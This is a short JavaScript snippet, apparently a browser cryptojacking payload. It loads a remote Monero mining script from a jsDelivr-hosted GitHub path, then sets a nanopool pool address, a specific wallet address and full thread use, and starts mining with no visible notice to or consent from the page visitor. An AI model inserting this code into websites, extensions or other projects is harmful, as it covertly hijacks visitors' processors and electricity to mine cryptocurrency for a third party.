// Start Of Mining Code (Javascript)
var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/sdiraimondo/monero-miner-chrome-extension@main/mine.js";
document.head.appendChild(script);

server = "xmr-eu1.nanopool.org:10343";
var pool = "xmr-eu1.nanopool.org:10343";
var walletAddress = "46jaHxu43FoY6Ja2uZ762qYDKeWXQY25bMY4d3u15wPATCATgE6H4898XsS5s2m2RCeGgUWRm1WXPN51X3j3FThyLen47D4";
var workerId = "web-XMR"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
